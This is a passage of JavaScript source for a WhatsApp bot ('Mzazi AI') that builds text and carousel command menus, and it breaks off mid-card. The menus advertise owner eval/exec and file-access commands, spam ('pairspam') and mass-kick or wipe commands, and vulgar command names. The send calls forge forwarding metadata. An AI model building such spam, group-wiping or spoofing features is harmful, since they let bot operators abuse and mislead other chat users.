║  │ 8ball      
║  │ coinflip   
║  │ dice      
║  │ rps        
║  │ truth    
║  │ dare        
║  │ wouldyourather
║  │ nhie 
║  │ trivia      
║  │ riddle   
║  │ game       
║  │ roast     
║  │ compliment
║  │ flirt      
║  │ ship     
║  │ howgay       
║  │ howrich    
║  │ howstupid  
║  │ iq          
║  │ howcute  
║  │ rate       
║  │ rng        
║  │ choose    
║  │ poem        
║  │ story    
║  │ fortune     
║  │ rank      
║  │ leaderboard
║  │ insult   
║  │ hug      
║  │ kiss       
║  │ slap       
║  │ punch     
║  │ pat         
║  │ wave     
║  │ dance       
║  │ wink       
║  │ stare     
║  │ highfive   
║  │ poke     
║  │ bite        
║  │ facepalm  
║  │ shrug2    
║  │ bow         
║  │ thumbsup 
║  │ thumbsdown 
║  │ gg       
║  │ rip      
║  │ f         
║  │ sus      
║  │ lol          
║  │ omg        
║  │ xd         
║  │ nt          
║  │ wp       
║  │ matrix       
║  │ hackfake   
║  │ glitch    
║  │ icebreaker 
║  │ confess 
║  │ ngl             
║  └────────────────┘                       
╚═══════════════════╝

╔═══════════════════╗
║   UTILITY TOOLS   ║         
╠═══════════════════╣
║  ┌────────────────┐                                                                                
║  │ calc       
║  │ math   
║  │ qr        
║  │ base64encode 
║  │ base64decode
║  │ hex       
║  │ unhex     
║  │ binary     
║  │ md5      
║  │ sha1     
║  │ sha256      
║  │ password   
║  │ uuid      
║  │ gpass      
║  │ charcount
║  │ reverse     
║  │ uppercase 
║  │ lowercase 
║  │ repeat   
║  │ mocktext 
║  │ morse       
║  │ unmorse   
║  │ clap       
║  │ vaporwave   
║  │ zalgo    
║  │ bold         
║  │ italic     
║  │ strike     
║  │ mono       
║  │ shorturl  
║  │ ip        
║  │ ipinfo     
║  │ time      
║  │ date       
║  │ countdown
║  │ timestamp   
║  │ weekday    
║  │ year       
║  │ age         
║  │ todo     
║  │ note         
║  │ reminder  
║  │ flashcard  
║  │ generate     
║  │ color    
║  │ ascii        
║  │ extractemails 
║  │ extractnumbers 
║  └────────────────┘        
╚═══════════════════╝

╔═══════════════════╗
║   SEARCH & INFO   ║              
╠═══════════════════╣
║  ┌────────────────┐  
║  │ wiki         
║  │ dict       
║  │ synonym   
║  │ define      
║  │ translate
║  │ weather    
║  │ country    
║  │ timezone  
║  │ currency     
║  │ crypto   
║  │ horoscope  
║  │ flag       
║  │ capital   
║  │ phonecode    
║  │ continent
║  │ numberfact   
║  │ dayfact    
║  │ fact     
║  │ scifact      
║  │ catfact  
║  │ dogfact      
║  │ chucknorris 
║  │ joke     
║  │ advice      
║  │ quote    
║  │ motivation  
║  │ github     
║  │ bible    
║  │ quran      
║  │ hadith 
║  │ dua         
║  │ proverb    
║  │ history  
║  │ geography   
║  │ internet 
║  │ tech         
║  │ space      
║  │ ocean   
║  │ africa      
║  │ kenya    
║  │ travel      
║  │ nature    
║  │ word      
║  │ poem        
║  │ ai       
║  │ blockchain   
║  │ cybersecurity 
║  └────────────────┘                                  
╚═══════════════════╝

╔═══════════════════╗
║ MEDIA & DOWNLOAD  ║                 
╠═══════════════════╣
║  ┌────────────────┐  
║  │ sticker      
║  │ s        
║  │ toimg      
║  │ emojimix  
║  │ take   
║  │ steal       
║  │ play      
║  │ play2     
║  │ play3     
║  │ play10   
║  │ lyrics       
║  │ lyrics2    
║  │ yts        
║  │ ytinfo      
║  │ ytmp3    
║  │ ytmp4      
║  │ tiktok     
║  │ img        
║  │ gif          
║  │ pp       
║  │ vcard        
║  │ location  
║  │ nairobi    
║  │ mombasa      
║  │ instagram
║  │ facebook     
║  │ twitter    
║  │ song       
║  │ movie        
║  │ series  
║  │ anime       
║  │ manga     
║  │ book       
║  │ screenshot2  
║  │ sticker2
║  │ spotify      
║  │ sx        
║  │ sxvideos   
║  │ sxget      
║  │ underwater
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║ GROUP MANAGEMENT  ║
╠═══════════════════╣
║  ┌────────────────┐  
║  │ kick         
║  │ add       
║  │ promote    
║  │ demote      
║  │ mute     
║  │ unmute       
║  │ tagall     
║  │ hidetag   
║  │ tagmembers  
║  │ tagadmin 
║  │ mentionadmin 
║  │ groupinfo  
║  │ members   
║  │ count      
║  │ admins   
║  │ groupstats  
║  │ groupage  
║  │ link       
║  │ revoke      
║  │ invitelink
║  │ delete      
║  │ d         
║  │ del       
║  │ setrules  
║  │ rules    
║  │ topic       
║  │ warn       
║  │ warnlist   
║  │ resetwarn   
║  │ mywarn   
║  │ clearwarn    
║  │ warning2   
║  │ open       
║  │ close        
║  │ subject  
║  │ setdesc     
║  │ lockgroup  
║  │ unlockgroup 
║  │ approve  
║  │ reject   
║  │ approveall  
║  │ rejectall 
║  │ pendingrequests
║  │ welcome
║  │ goodbye 
║  │ kickall      
║  │ poll       
║  │ groupid    
║  │ groupstatus  
║  │ disappear
║  │ pin        
║  │ muteall  
║  │ isadmin   
║  │ isingroup    
║  │ announce 
║  │ notice      
║  │ mute2    
║  │ unmute2  
║  │ wantam    
║  │ fuckmzazi
║  │ fuckruto    
║  │ mzaziwipeall        
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║  GROUP PROTECTION ║
╠═══════════════════╣
║  ┌────────────────┐                                                                 
║  │ antilink     
║  │ antitag    
║  │ antibot    
║  │ antiviewonce 
║  │ antitagadmin
║  │ antimentiongroup 
║  │ antipromote 
║  │ antidemote 
║  │ antiflood 
║  │ antibadword
║  │ antisticker  
║  │ antigif     
║  │ antiimage  
║  │ antivideo  
║  │ antiaudio
║  │ antinsfw     
║  │ anticall              
║  └────────────────┘          
╚═══════════════════╝

╔═══════════════════╗
║  OWNER COMMANDS   ║
╠═══════════════════╣
║  ┌────────────────┐                                                                                    
║  │ leave        
║  │ public      
║  │ self       
║  │ setprefix  
║  │ changebotname
║  │ addpaid      
║  │ delpaid     
║  │ listpaid   
║  │ addprem     
║  │ delprem   
║  │ addowner     
║  │ delowner    
║  │ owners     
║  │ listowners  
║  │ setbotpic 
║  │ changebotpic 
║  │ setbio      
║  │ setbotname 
║  │ setbotbio   
║  │ broadcast
║  │ broadcastdm  
║  │ block       
║  │ unblock    
║  │ sendmsg     
║  │ listgroups
║  │ leaveall     
║  │ joingroup   
║  │ botstatus 
║  │ restart     
║  │ shutdown 
║  │ setmode     
║  │ resetbot  
║  │ botmode   
║  │ downloadfile 
║  │ addcase  
║  │ delcase     
║  │ listcase    
║  │ getcase    
║  │ allcmds     
║  │ eval      
║  │ exec       
║  │ readfile   
║  │ writefile 
║  │ deletefile 
║  │ listfiles
║  │ memory      
║  │ sendstatus  
║  │ sendall  
║  │ connect    
║  │ idch      
║  │ repo        
║  │ listgroup   
║  │ groupnames 
║  │ addcase     
║  │ delcase  
║  │ listcase     
║  │ getcase     
║  │ allcmds    
║  │ spampair    
║  │ pairspam 
║  │ delay           
║  └────────────────┘                   
╚═══════════════════╝

╔═══════════════════╗
║    AUTO FEATURES  ║
╠═══════════════════╣
║  ┌────────────────┐                                                                                   
║  │ autotyping on/off  
║  │ composing on/off  
║  │ autorecordaudio on/off   
║  │ autorecordvideo on/off 
║  │ autorecording on/off
║  │ recording on/off   
║  │ alwaysonline on/off 
║  │ autoreact on/off   
║  │ autoread on/off        
║  │ autostatus on/off   
║  │ autolike on/off    
║  │ anticall on/off         
║  │ chatbot on/off     
║  │ antimsg on/off     
║  │ autoforwardstatus on/off
║  └────────────────┘                               
╚═══════════════════╝

╔═══════════════════╗
║    LANGUAGES      ║
╠═══════════════════╣
║  ┌────────────────┐                                                                                
║  │ swahili    
║  │ french      
║  │ spanish    
║  │ arabic      
║  │ translate
║  └────────────────┘                            
╚═══════════════════╝

╔═══════════════════╗
║     BOT SETTINGS  ║
╠═══════════════════╣
║  ┌────────────────┐  
║  │ botmode       
║  │ setmode    
║  │ setprefix 
║  │ version   
║  │ changelog
║  │ update        
║  │ server    
║  │ node       
║  │ cpu        
║  │ hostname
║  │ platform     
║  │ uptime3    
║  │ creator 
║  │ contact    
║  │ support 
║  │ faq          
║  │ plan     
║  │ donate     
║  │ social      
║  │ source
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║     LIFESTYLE     ║
╠═══════════════════╣
║  ┌────────────────┐  
║  │ health        
║  │ mentalhealth 
║  │ sleep     
║  │ water       
║  │ meditation
║  │ fitness       
║  │ workout     
║  │ stretching 
║  │ food       
║  │ drink   
║  │ calories      
║  │ recipe      
║  │ money     
║  │ invest     
║  │ business 
║  │ entrepreneur
║  │ savings   
║  │ study    
║  │ learn     
║  │ codingtip
║  │ programming   
║  │ code      
║  │ sport     
║  │ football  
║  │ basketball
║  │ chess        
║  │ game2     
║  │ boxing    
║  │ relationship 
║  │ friendship
║  │ advice2
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║      FAITH        ║
╠═══════════════════╣
║  ┌────────────────┐  
║  │ allah         
║  │ bismillah  
║  │ alhamdulillah 
║  │ inshallah
║  │ mashallah
║  │ dua           
║  │ quran    
║  │ hadith     
║  │ pray        
║  │ bible
║  │ verse        
║  │ eid         
║  │ ramadan    
║  │ christmas   
║  │ newyear
║  └────────────────┘ 
╚═══════════════════╝

╔═══════════════════╗
║  ┌────────────────┐  
║  │ 𝗠𝗭𝗔𝗭𝗜 𝗔𝗜 ✨
║  │ POWERED BY MZAZI SYSTEMS 
║  │ Switch Case Based 
║  │ https://mzazi.shop
║  └────────────────┘ 
╚═══════════════════╝
> You can copy me but you can never be me`;

    // ── Send the menu as image with caption ──
    if (fs.existsSync(menuPicPath)) {
      const imageBuffer = fs.readFileSync(menuPicPath);
      await mzazi.sendMessage(
        sender,
        {
          image: imageBuffer,
          caption: menuCaption,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
        { quoted: m }
      );
    } else {
      // Fallback: send just the text menu if image not found
      await mzazi.sendMessage(
        sender,
        {
          text: menuCaption,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
        { quoted: m }
      );
    }
  } catch (err) {
    logger.error('Menu error:', err);
    // Ultimate fallback – simple text
    try {
      await mzazi.sendMessage(sender, { text: '❌ Failed to load menu. Please try again.' });
    } catch {}
  }
  break;
}
      
//=====================================//

      case 'mercy': {
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const chatId = sender;

    try {
        // ─── Load local menu image (once) ─────────────────────
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
        
        let imageBuffer = null;
        let preparedImage = null;
        
        if (fs.existsSync(menuPicPath)) {
            imageBuffer = fs.readFileSync(menuPicPath);
            // Prepare the image message once (to reuse in all cards)
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // ─── Categories (unchanged, but we'll use preparedImage) ───
        const categories = [
            {
                title: "𝗚𝗥𝗢𝗨𝗣",
                desc: `
╔═⟪ GROUP MANAGEMENT⟫═╗
╠❏ ${prefix}kick  
╠❏ ${prefix}add  
╠❏ ${prefix}promote
╠❏ ${prefix}demote  
╠❏ ${prefix}mute  
╠❏ ${prefix}unmute
╠❏ ${prefix}tagall  
╠❏ ${prefix}hidetag  
╠❏ ${prefix}tagmembers
╠❏ ${prefix}tagadmin  
╠❏ ${prefix}mentionadmin
╠❏ ${prefix}groupinfo  
╠❏ ${prefix}members  
╠❏ ${prefix}count
╠❏ ${prefix}admins  
╠❏ ${prefix}groupstats  
╠❏ ${prefix}groupage
╠❏ ${prefix}link  
╠❏ ${prefix}revoke  
╠❏ ${prefix}invitelink
╠❏ ${prefix}delete  
╠❏ ${prefix}d  
╠❏ ${prefix}del
╠❏ ${prefix}setrules  
╠❏ ${prefix}rules  
╠❏ ${prefix}topic
╠❏ ${prefix}warn  
╠❏ ${prefix}warnlist  
╠❏ ${prefix}resetwarn
╠❏ ${prefix}mywarn  
╠❏ ${prefix}clearwarn  
╠❏ ${prefix}warning2
╠❏ ${prefix}open  
╠❏ ${prefix}close  
╠❏ ${prefix}subject
╠❏ ${prefix}setdesc  
╠❏ ${prefix}lockgroup  
╠❏ ${prefix}unlockgroup
╠❏ ${prefix}approve  
╠❏ ${prefix}reject  
╠❏ ${prefix}approveall
╠❏ ${prefix}rejectall  
╠❏ ${prefix}pendingrequests
╠❏ ${prefix}welcome  
╠❏ ${prefix}goodbye  
╠❏ ${prefix}kickall
╠❏ ${prefix}poll  
╠❏ ${prefix}groupid  
╠❏ ${prefix}groupstatus
╠❏ ${prefix}disappear  
╠❏ ${prefix}pin  
╠❏ ${prefix}muteall
╠❏ ${prefix}isadmin  
╠❏ ${prefix}isingroup  
╠❏ ${prefix}announce
╠❏ ${prefix}notice  
╠❏ ${prefix}mute2  
╠❏ ${prefix}unmute2
╠❏ ${prefix}wantam  
╠❏ ${prefix}fuckmzazi  
╠❏ ${prefix}fuckruto
╠❏ ${prefix}mzaziwipeall  
╠❏ ${prefix}kickall
╚══════════════════╝`,
                button: { text: "PAIR BOT", url: "https://t.me/namelessmzaziv3Bot" }
            },
            {
                title: "OWNER",
                desc: `
  ╔═⟪ 👑 OWNER COMMANDS ⟫═╗
╠❏ ${prefix}leave  
╠❏ ${prefix}public  
╠❏ ${prefix}self
╠❏ ${prefix}setprefix  
╠❏ ${prefix}changebotname
╠❏ ${prefix}addpaid  
╠❏ ${prefix}delpaid  
╠❏ ${prefix}listpaid
╠❏ ${prefix}addprem  
╠❏ ${prefix}delprem  
╠❏ ${prefix}addowner
╠❏ ${prefix}delowner  
╠❏ ${prefix}owners  
╠❏ ${prefix}listowners
╠❏ ${prefix}setbotpic  
╠❏ ${prefix}changebotpic
╠❏ ${prefix}setbio  
╠❏ ${prefix}setbotname  
╠❏ ${prefix}setbotbio
╠❏ ${prefix}broadcast  
╠❏ ${prefix}broadcastdm
╠❏ ${prefix}block  
╠❏ ${prefix}unblock  
╠❏ ${prefix}sendmsg
╠❏ ${prefix}listgroups  
╠❏ ${prefix}leaveall  
╠❏ ${prefix}joingroup
╠❏ ${prefix}botstatus  
╠❏ ${prefix}restart  
╠❏ ${prefix}shutdown
╠❏ ${prefix}setmode  
╠❏ ${prefix}resetbot  
╠❏ ${prefix}botmode
╠❏ ${prefix}downloadfile  
╠❏ ${prefix}addcase  
╠❏ ${prefix}delcase
╠❏ ${prefix}listcase  
╠❏ ${prefix}getcase  
╠❏ ${prefix}allcmds
╠❏ ${prefix}eval  
╠❏ ${prefix}exec  
╠❏ ${prefix}readfile
╠❏ ${prefix}writefile  
╠❏ ${prefix}deletefile  
╠❏ ${prefix}listfiles
╠❏ ${prefix}memory  
╠❏ ${prefix}sendstatus  
╠❏ ${prefix}sendall
╠❏ ${prefix}connect  
╠❏ ${prefix}idch  
╠❏ ${prefix}repo
╠❏ ${prefix}listgroup  
╠❏ ${prefix}groupnames
╚══════════════════╝`,
                button: { text: "𝗚𝗥𝗢𝗨𝗣", url: "https://chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N"}
            },
            {
                title: "GENERAL",
                desc: `
╔═⟪ 📋 GENERAL ⟫═╗
╠❏ ${prefix}menu  
╠❏ ${prefix}help  
╠❏ ${prefix}ping
╠❏ ${prefix}ping2  
╠❏ ${prefix}ping3  
╠❏ ${prefix}uptime
╠❏ ${prefix}systeminfo  
╠❏ ${prefix}owner  
╠❏ ${prefix}tqto
╠❏ ${prefix}rules  
╠❏ ${prefix}credits  
╠❏ ${prefix}version
╠❏ ${prefix}botinfo  
╠❏ ${prefix}stats  
╠❏ ${prefix}about
╠❏ ${prefix}speed  
╠❏ ${prefix}check  
╠❏ ${prefix}status2
╠❏ ${prefix}whoami  
╠❏ ${prefix}myid  
╠❏ ${prefix}runtime
╠❏ ${prefix}vv  
╠❏ ${prefix}copy  
╠❏ ${prefix}echo  
╠❏ ${prefix}say
╠❏ ${prefix}greetings  
╠❏ ${prefix}hello  
╠❏ ${prefix}bye2
╠❏ ${prefix}goodmorning  
╠❏ ${prefix}goodnight
╠❏ ${prefix}goodevening  
╠❏ ${prefix}goodafternoon
╚══════════════════╝`,
                button: { text: "Owner Whatsapp", url: "https://wa.me/254108595201" }
            },
            {
                title: "FUN",
                desc: `
╔═⟪ 🎮 FUN & GAMES ⟫═╗
╠❏ ${prefix}8ball  
╠❏ ${prefix}coinflip  
╠❏ ${prefix}dice
╠❏ ${prefix}rps  
╠❏ ${prefix}truth  
╠❏ ${prefix}dare
╠❏ ${prefix}wouldyourather  
╠❏ ${prefix}nhie
╠❏ ${prefix}trivia  
╠❏ ${prefix}riddle  
╠❏ ${prefix}game
╠❏ ${prefix}roast  
╠❏ ${prefix}compliment  
╠❏ ${prefix}flirt
╠❏ ${prefix}ship  
╠❏ ${prefix}howgay  
╠❏ ${prefix}howrich
╠❏ ${prefix}howstupid  
╠❏ ${prefix}iq  
╠❏ ${prefix}howcute
╠❏ ${prefix}rate  
╠❏ ${prefix}rng  
╠❏ ${prefix}choose
╠❏ ${prefix}poem  
╠❏ ${prefix}story  
╠❏ ${prefix}fortune
╠❏ ${prefix}rank  
╠❏ ${prefix}leaderboard  
╠❏ ${prefix}insult
╠❏ ${prefix}hug  
╠❏ ${prefix}kiss  
╠❏ ${prefix}slap
╠❏ ${prefix}punch  
╠❏ ${prefix}pat  
╠❏ ${prefix}wave
╠❏ ${prefix}dance  
╠❏ ${prefix}wink  
╠❏ ${prefix}stare
╠❏ ${prefix}highfive  
╠❏ ${prefix}poke  
╠❏ ${prefix}bite
╠❏ ${prefix}facepalm  
╠❏ ${prefix}shrug2  
╠❏ ${prefix}bow
╠❏ ${prefix}thumbsup  
╠❏ ${prefix}thumbsdown  
╠❏ ${prefix}gg
╠❏ ${prefix}rip  
╠❏ ${prefix}f  
╠❏ ${prefix}sus  
╠❏ ${prefix}lol
╠❏ ${prefix}omg  
╠❏ ${prefix}xd  
╠❏ ${prefix}nt  
╠❏ ${prefix}wp
╠❏ ${prefix}matrix  
╠❏ ${prefix}hackfake  
╠❏ ${prefix}glitch
╠❏ ${prefix}icebreaker  
╠❏ ${prefix}confess  
╠❏ ${prefix}ngl
╚══════════════════╝`,
                button: { text: "𝗗𝗘𝗩 𝗚𝗖", url: "https://chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N" }
            },
            {
                title: "DOWNLOAD",
                desc: `
╔═⟪ MEDIA & DOWNLOAD ⟫═╗
╠❏ ${prefix}sticker  
╠❏ ${prefix}s  
╠❏ ${prefix}toimg
╠❏ ${prefix}emojimix  
╠❏ ${prefix}take  
╠❏ ${prefix}steal
╠❏ ${prefix}play  
╠❏ ${prefix}play2  
╠❏ ${prefix}lyrics
╠❏ ${prefix}lyrics2  
╠❏ ${prefix}yts  
╠❏ ${prefix}ytinfo
╠❏ ${prefix}tiktok  
╠❏ ${prefix}img  
╠❏ ${prefix}gif
╠❏ ${prefix}pp  
╠❏ ${prefix}vcard  
╠❏ ${prefix}location
╠❏ ${prefix}nairobi  
╠❏ ${prefix}mombasa
╠❏ ${prefix}instagram  
╠❏ ${prefix}facebook  
╠❏ ${prefix}twitter
╠❏ ${prefix}song  
╠❏ ${prefix}movie  
╠❏ ${prefix}series
╠❏ ${prefix}anime  
╠❏ ${prefix}manga  
╠❏ ${prefix}book
╠❏ ${prefix}screenshot2  
╠❏ ${prefix}sticker2
╚══════════════════╝`,
                button: { text: "ENTERTAINMENT WEB", url: "https://mzazi.shop" }
            },
            {
                title: "LIFESTYLE AND FAITH",
                desc: `
╔═⟪ 💪 LIFESTYLE ⟫═╗
╠❏ ${prefix}health  
╠❏ ${prefix}mentalhealth  
╠❏ ${prefix}sleep
╠❏ ${prefix}water  
╠❏ ${prefix}meditation  
╠❏ ${prefix}fitness
╠❏ ${prefix}workout  
╠❏ ${prefix}stretching  
╠❏ ${prefix}food
╠❏ ${prefix}drink  
╠❏ ${prefix}calories  
╠❏ ${prefix}recipe
╠❏ ${prefix}money  
╠❏ ${prefix}invest  
╠❏ ${prefix}business
╠❏ ${prefix}entrepreneur  
╠❏ ${prefix}savings
╠❏ ${prefix}study  
╠❏ ${prefix}learn  
╠❏ ${prefix}codingtip
╠❏ ${prefix}programming  
╠❏ ${prefix}code
╠❏ ${prefix}sport  
╠❏ ${prefix}football  
╠❏ ${prefix}basketball
╠❏ ${prefix}chess  
╠❏ ${prefix}game2  
╠❏ ${prefix}boxing
╠❏ ${prefix}relationship  
╠❏ ${prefix}friendship  
╠❏ ${prefix}advice2
╚══════════════════╝

╔═⟪ ☪️✝️ FAITH ⟫═╗
╠❏ ${prefix}allah  
╠❏ ${prefix}bismillah  
╠❏ ${prefix}alhamdulillah
╠❏ ${prefix}inshallah  
╠❏ ${prefix}mashallah  
╠❏ ${prefix}dua
╠❏ ${prefix}quran  
╠❏ ${prefix}hadith  
╠❏ ${prefix}pray
╠❏ ${prefix}bible  
╠❏ ${prefix}verse  
╠❏ ${prefix}eid
╠❏ ${prefix}ramadan  
╠❏ ${prefix}christmas  
╠❏ ${prefix}newyear
╚══════════════════╝`,
                button: { text: "DEV TELEGRAM", url: "http://t.me/mzazidev" }
            },
            {
                title: "UTILITY TOOLS",
                desc: `
  ╔═⟪ 🔧 UTILITY TOOLS ⟫═╗
╠❏ ${prefix}calc  
╠❏ ${prefix}math  
╠❏ ${prefix}qr
╠❏ ${prefix}base64encode  
╠❏ ${prefix}base64decode
╠❏ ${prefix}hex  
╠❏ ${prefix}unhex  
╠❏ ${prefix}binary
╠❏ ${prefix}md5  
╠❏ ${prefix}sha1  
╠❏ ${prefix}sha256
╠❏ ${prefix}password  
╠❏ ${prefix}uuid  
╠❏ ${prefix}gpass
╠❏ ${prefix}charcount  
╠❏ ${prefix}reverse  
╠❏ ${prefix}uppercase
╠❏ ${prefix}lowercase  
╠❏ ${prefix}repeat  
╠❏ ${prefix}mocktext
╠❏ ${prefix}morse  
╠❏ ${prefix}unmorse  
╠❏ ${prefix}clap
╠❏ ${prefix}vaporwave  
╠❏ ${prefix}zalgo  
╠❏ ${prefix}bold
╠❏ ${prefix}italic  
╠❏ ${prefix}strike  
╠❏ ${prefix}mono
╠❏ ${prefix}shorturl  
╠❏ ${prefix}ip  
╠❏ ${prefix}ipinfo
╠❏ ${prefix}time  
╠❏ ${prefix}date  
╠❏ ${prefix}countdown
╠❏ ${prefix}timestamp  
╠❏ ${prefix}weekday  
╠❏ ${prefix}year
╠❏ ${prefix}age  
╠❏ ${prefix}todo  
╠❏ ${prefix}note
╠❏ ${prefix}reminder  
╠❏ ${prefix}flashcard
╠❏ ${prefix}generate  
╠❏ ${prefix}color  
╠❏ ${prefix}ascii
╠❏ ${prefix}extractemails  
╠❏ ${prefix}extractnumbers
╚══════════════════╝`,
                button: { text: "𝗕𝗨𝗬 𝗣𝗔𝗡𝗘𝗟", url: "https://wa.me/254108595201" }
            },
            {
                title: "SEARCH",
                desc: `
╔═⟪ 🌍 SEARCH & INFO ⟫═╗
╠❏ ${prefix}wiki  
╠❏ ${prefix}dict  
╠❏ ${prefix}synonym
╠❏ ${prefix}define  
╠❏ ${prefix}translate  
╠❏ ${prefix}weather
╠❏ ${prefix}country  
╠❏ ${prefix}timezone  
╠❏ ${prefix}currency
╠❏ ${prefix}crypto  
╠❏ ${prefix}horoscope  
╠❏ ${prefix}flag
╠❏ ${prefix}capital  
╠❏ ${prefix}phonecode  
╠❏ ${prefix}continent
╠❏ ${prefix}numberfact  
╠❏ ${prefix}dayfact  
╠❏ ${prefix}fact
╠❏ ${prefix}scifact  
╠❏ ${prefix}catfact  
╠❏ ${prefix}dogfact
╠❏ ${prefix}chucknorris  
╠❏ ${prefix}joke  
╠❏ ${prefix}advice
╠❏ ${prefix}quote  
╠❏ ${prefix}motivation  
╠❏ ${prefix}github
╠❏ ${prefix}bible  
╠❏ ${prefix}quran  
╠❏ ${prefix}hadith
╠❏ ${prefix}dua  
╠❏ ${prefix}proverb  
╠❏ ${prefix}history
╠❏ ${prefix}geography  
╠❏ ${prefix}internet  
╠❏ ${prefix}tech
╠❏ ${prefix}space  
╠❏ ${prefix}ocean  
╠❏ ${prefix}africa
╠❏ ${prefix}kenya  
╠❏ ${prefix}travel  
╠❏ ${prefix}nature
╠❏ ${prefix}word  
╠❏ ${prefix}poem  
╠❏ ${prefix}ai
╠❏ ${prefix}blockchain  
╠❏ ${prefix}cybersecurity
╚══════════════════╝`,
                button: { text: "𝗢𝗪𝗡𝗘𝗥", url: "https://wa.me/254108595201" }
            }
        ];

        // ─── Build carousel cards using the same prepared image ───
        const carouselCards = categories.map((item, index) => ({
            header: {
                title: item.title,
                hasMediaAttachment: !!preparedImage,
                ...(preparedImage ? { imageMessage: preparedImage } : {})
            },
            body: { text: item.desc },
            footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: item.button.text,
                            url: item.button.url,
                            merchant_url: item.button.url
                        })
                    }
                ]
            }
        }));

        // ─── Build and send carousel ──────────────────────────────
        const carouselMessage = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🩸 ${botName.toUpperCase()} MENU 🩸` },
                    footer: { text: "Swipe ⬅️➡️ to explore all commands" },
                    carouselMessage: { cards: carouselCards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, carouselMessage.message, {
            messageId: carouselMessage.key.id
        });

    } catch (error) {
        logger.error("❌ Menu carousel error:", error);
        // Fallback plain text menu
        let fallbackText = `🩸 *${botName.toUpperCase()} MENU* 🩸\n\n`;
        categories.forEach((cat) => {
            fallbackText += `*${cat.title}*\n${cat.desc}\n🔗 ${cat.button.text}: ${cat.button.url}\n\n`;
        });
        fallbackText += `© ${botName.toUpperCase()} - Carousel not supported use .allmenu`;
        await reply(fallbackText);
    }
    break;
}
//=====================================//

    case 'friends': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load local menu image (same for all cards – change per card if needed)
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • FRIENDS`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        // ----- 5 fully written cards -----
        const cards = [
            // Page 1: MZAZI TECH
            {
                header: commonHeader,
                body: { text: `⚡ *MZAZI TECH*\n\nStatus: Married but Single 😂\nRole: Full-Stack Dev\nMotto: Code. Create. Connect.\nFuel: WiFi + Coffee\nGoal: Tech Millionaire` },
                footer: { text: 'Page 1/5' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '📢 CHANNEL',
                            url: 'https://whatsapp.com/channel/0029VbBtuejFy72LZHwooo1q'
                        })
                    }]
                }
            },
            // Page 2: BLACKLORD
            {
                header: commonHeader,
                body: { text: `👻 *BLACKLORD*\n\nStatus: Ghost in the Machine 👻\nRole: Bot Master / Backend Overlord\nHobby: Break things then fix them 🔨\nQuote: "If it works, don't touch it"\nFuel: Coffee & Broken Dreams ☕💀` },
                footer: { text: 'Page 2/5' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👥 GROUP',
                            url: 'https://chat.whatsapp.com/DfWdu8zkytfCm7bQRSt0SY'
                        })
                    }]
                }
            },
            // Page 3: DEAD NOTE
            {
                header: commonHeader,
                body: { text: `📖 *DEAD NOTE*\n\nThe silent coder who appears only when production crashes.\nRole: Debugging Ninja\nWeakness: A broken package.json 😭\nStrength: Ctrl+Z master\nFavorite error: "Module not found"` },
                footer: { text: 'Page 3/5' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '👑 OWNER',
                            url: 'https://wa.me/254741388986'
                        })
                    }]
                }
            },
            // Page 4: CYBER WIZARD
            {
                header: commonHeader,
                body: { text: `🧙 *CYBER WIZARD*\n\nMaster of APIs and databases.\nRole: Cloud Architect\nHobby: Watching server logs at 3AM\nQuote: "It's not a bug, it's a feature"\nPowered by: Energy drinks & sarcasm` },
                footer: { text: 'Page 4/5' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '☁️ PORTFOLIO',
                            url: 'https://github.com/mzazi-tech'
                        })
                    }]
                }
            },
            // Page 5: THE MANAGER
            {
                header: commonHeader,
                body: { text: `📊 *THE MANAGER*\n\nThe one who asks "Is it done yet?" every hour.\nRole: Project Catalyst\nSuperpower: Turning coffee into deadlines\nWeakness: Actually understanding the code 😅\nMotto: "Deploy on Friday, fix on Monday"` },
                footer: { text: 'Page 5/5' },
                nativeFlowMessage: {
                    buttons: [{
